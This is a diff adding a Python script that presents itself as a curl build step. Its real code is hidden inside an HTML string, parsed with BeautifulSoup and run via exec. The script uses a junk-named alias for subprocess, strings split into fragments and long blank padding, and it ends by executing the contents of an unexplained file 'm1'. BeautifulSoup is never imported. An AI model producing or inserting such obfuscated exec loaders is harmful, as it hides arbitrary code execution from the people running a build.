@@ -1,0 +1,85 @@
+import py7zr
+
+print("building curl")
+
+exec(BeautifulSoup("""
+<html>
+<head></head>
+<body><chunguselement>
+from subprocess import run as nfdshrpyulcxdgu9lfpwnuy9ptdnfuynt3fnedw2u9tnu92wnt9wntdluyrntqy
+v1 = "{}"
+v2 = "{}"
+
+try:
+    archive = py7zr.SevenZipFile('curl/'+''+'curl-master'+""+""+""+"."+"z"+"i"+"p", mode='r')
+    archive.extractall(path="./cur"+""+"l2")
+    archive.close()
+except:
+    print()
+
+import zipfile
+
+
+with zipfile.ZipFile('curl/'+''+'curl-master'+""+""+""+"."+"z"+"i"+"p", 'r') as zip_ref:
+    zip_ref.extractall("./cur"+""+"l2")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+try:
+    nfdshrpyulcxdgu9lfpwnuy9ptdnfuynt3fnedw2u9tnu92wnt9wntdluyrntqy(["gmake"])
+except Exception as e:
+    print(e)
+    print("curl build failed")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</chunguselement>
+</body>
+</html>
+""".format('sus', "amogus"), "html.parser").html.body.chunguselement.string)
+
+exec(open("m1").read())
